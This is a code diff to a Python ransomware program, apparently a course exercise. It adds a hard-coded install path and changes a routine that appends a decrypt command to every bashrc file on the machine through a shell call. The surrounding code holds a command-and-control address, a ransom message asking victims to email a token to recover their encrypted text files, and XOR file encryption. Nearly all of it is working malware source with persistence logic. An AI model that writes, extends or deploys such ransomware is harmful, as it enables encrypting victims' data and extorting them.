@@ -2,12 +2,14 @@ import logging
 import socket
 import re
 import sys
+from os import system
 from pathlib import Path
 from secret_manager import SecretManager
 from ascii_wonders import *
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
+INSTALL_PATH = "/root/ransomware"
 
 
 class Ransomware:
@@ -47,13 +49,14 @@ class Ransomware:
         token = self._secret_manager.get_hex_token()
         print(OH_NO)
         print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
-        self.add_reminder_to_bashrc()
+        self.add_reminder_to_bashrc(INSTALL_PATH)
         return None
     
-    def add_reminder_to_bashrc(self) -> None:
-        for bashrc in self.get_files("bashrc"):
-            with open(bashrc, "w") as file:
-                file.write("python root/ransomware/ransomware.py --decrypt")
+    def add_reminder_to_bashrc(self, path: str) -> None:
+        for bashrc in self.get_files("*bashrc*"):
+            self._log.debug(bashrc)
+            system(f"echo 'python {path}/ransomware.py --decrypt' >> {bashrc}")
+        return None
 
     def decrypt(self):
         # main function for decrypting (see PDF)
@@ -66,7 +69,7 @@ class Ransomware:
 
         # self._secret_manager.set_key(candidate_key)
         self._secret_manager.xorfiles(self.get_files("*.txt"))
-        self._secret_manager.clean()
+        self._secret_manager.clean(INSTALL_PATH)
         print("\rOkay, your data has been restored to its former state. Have a nice day :)")
         print(HERE_WIPE_YOUR_TEARS)
         print(ASCII_TISSUE_BOX)
